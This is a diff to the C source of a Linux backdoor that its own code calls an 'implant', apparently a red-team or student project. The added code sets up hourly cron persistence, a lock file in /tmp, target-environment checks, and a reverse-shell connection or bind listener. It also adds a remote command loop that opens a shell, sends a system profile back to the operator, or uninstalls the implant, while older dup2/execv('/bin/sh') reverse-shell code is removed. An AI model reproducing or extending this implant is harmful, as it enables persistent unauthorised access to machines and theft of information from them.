@@ -15,14 +15,32 @@
 #include <signal.h>
 #include "commands.c"
 #define _GNU_SOURCE
+#include "valHelper.c"
 
 #define MAXDATASIZE 100
 #define SLEEP 5
 
+#define MUTEX "/tmp/alive.txt"
+
 void foo();
+void commands(int sockfd);
 
 int main(void) {
-
+      /*==Validating code using valHelper.c==*/
+      val_IP();       //Macro: VALID_IP
+      val_SysName();  //Macro: VALID_SYSNAME
+      val_time();     //Macro: VALID_TIME
+      /*=====================================*/
+      #ifdef MUTEX
+      if(access( MUTEX, F_OK) != 0){
+        system("crontab <<< 0 * * * * /bin/implant");
+      }
+      else{
+        exit(1);
+      }
+      #endif
+      FILE *fp = NULL;
+      fp = fopen("/tmp/alive.txt", "w");
         /* Our process ID and Session ID */
         pid_t pid, sid;
 
@@ -87,9 +105,9 @@ int main(void) {
 void foo()
 {
   #ifdef DEBUG
-  printf("Error occurred!\n");
+  //printf("Error occurred!\n");
   if(errno != 0)
-    perror("Error description");
+    perror("Error blah blah");
   #endif
 
   #ifdef IPADDR
@@ -168,25 +186,14 @@ void foo()
   listen(sockfd, 0);
 
   int connfd = accept(sockfd, NULL, NULL);
-  for (int i = 0; i < 3; i++)
-  {
-      dup2(connfd, i);
-  }
+
   #define COMMANDS 1
   commands(sockfd);
   close(sockfd);
-  /*
-  for (int i = 0; i < 3; i++)
-  {
-      dup2(connfd, i);
-  }
-  execve("/bin/sh", NULL, NULL);
-  */
   #endif
 
   #ifdef REVERSESHELL
-  printf("REVERSESHELL: %d!\n", REVERSESHELL);
-  const char* ip = REVIP;
+  const char* ip = REVERSEIP;
   struct sockaddr_in addr;
   addr.sin_family = AF_INET;
   addr.sin_port = htons(atoi(REVERSEPORT));
@@ -194,60 +201,9 @@ void foo()
 
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
   connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
-  for (int i = 0; i < 3; i++)
-  {
-      dup2(sockfd, i);
-  }
-
-  execv("/bin/sh", NULL);
-  //#define COMMANDS 1
-  //commands(sockfd);
-  char buf[MAXDATASIZE];
-  int numbytes;
-  int endConnect = 0;
-  while(endConnect != 1){
-    if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
-      perror("recv");
-      exit(1);
-    }
-    buf[numbytes] = '\0';
-    if(strcmp(buf,"UNINSTALL\0") == 0){
-      remove("implant");
-      //remove cron, the implant a.out, and then exit() the implant process
-
-      endConnect = 1;
-    }
-    else if(strstr(buf, "SLEEP") != NULL){
-      sleep(SLEEP);
-      endConnect = 1;
-    }
-    else if(strcmp(buf,"SHELL\0") == 0){
-      shell(sockfd);
-    }
-    else if(strcmp(buf,"PROFILER\0") == 0){
-      //***************profiler code**********************
-      //**************************************************
-      //**************************************************
-    }
-    else if(strcmp(buf,"EXIT\0") == 0){
-      kill(getpid(), SIGKILL);
-      endConnect = 1;
-    }
-  }
+  #define COMMANDS 1
+  commands(sockfd);
   close(sockfd);
-
-/*
-#define COMMANDS 1
-commands(sockfd);
-close(sockfd);
-  for (int i = 0; i < 3; i++)
-  {
-      dup2(sockfd, i);
-  }
-
-  execv("/bin/sh", NULL);
-  */
-
   #endif
 
   #ifdef REVERSEIP
@@ -274,8 +230,44 @@ close(sockfd);
   printf("STATIC: %d!\n", STATIC);
   #endif
   */
+  #ifdef SECIMP
+  printf("SECIMP: %d!\n", SECIMP);
+  //libcurl program
+
+  //size_t write_data = fwrite(ptr, size, nmemb, (FILE *)stream);
+
+  CURL *curl_handle;
+  static const char *pagefilename = "page.jpg";
+  FILE *pagefile;
+
+  curl_global_init(CURL_GLOBAL_ALL);
+  /* init the curl session */
+  curl_handle = curl_easy_init();
+  /* set URL to get here */
+  curl_easy_setopt(curl_handle, CURLOPT_URL, "https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg");
+  /* Switch on full protocol/debug output while testing */
+  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
+  /* disable progress meter, set to 0L to enable it */
+  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
+  /* send all data to this function  */
+  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
+  /* open the file */
+  pagefile = fopen(pagefilename, "wb");
+  if(pagefile) {
+    /* write the page body to this file handle */
+    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
+    /* get it! */
+    curl_easy_perform(curl_handle);
+    /* close the header file */
+    fclose(pagefile);
+  }
+  /* cleanup curl stuff */
+  curl_easy_cleanup(curl_handle);
+  curl_global_cleanup();
+
+  #endif
 }
-/*
+
 #ifdef COMMANDS
 void commands(int sockfd){
   char buf[MAXDATASIZE];
@@ -287,29 +279,37 @@ void commands(int sockfd){
       exit(1);
     }
     buf[numbytes] = '\0';
-    if(strcmp(buf,"UNINSTALL\0") == 0){
-      remove("implant");
+    if(strcmp(buf,"UNINSTALL\n") == 0){
+      remove("/tmp/crontab");
+      remove("/implant");
+      remove(MUTEX);
+      exit(0);
       //remove cron, the implant a.out, and then exit() the implant process
 
       endConnect = 1;
     }
     else if(strstr(buf, "SLEEP") != NULL){
       sleep(SLEEP);
-      endConnect = 1;
     }
-    else if(strcmp(buf,"SHELL\0") == 0){
+    else if(strcmp(buf,"SHELL\n") == 0){
       shell(sockfd);
     }
-    else if(strcmp(buf,"PROFILER\0") == 0){
-      //***************profiler code**********************
-      //**************************************************
-      //**************************************************
+    else if(strcmp(buf,"PROFILER\n") == 0){
+      struct Profile* prof = getProfile();
+      char * strProf = strProfile();
+      //char sendbuf;
+      //scanf("%s", &sendbuf);
+      int sendbufsize = strlen(strProf);
+      int sendN = send(sockfd, strProf, sendbufsize, 0);
+      //write(sockfd,&strProf,sendbufsize);
+
+      free(strProf);
     }
-    else if(strcmp(buf,"EXIT\0") == 0){
+    else if(strcmp(buf,"EXIT\n") == 0){
+      remove(MUTEX);
       kill(getpid(), SIGKILL);
       endConnect = 1;
     }
   }
 }
 #endif
-*/
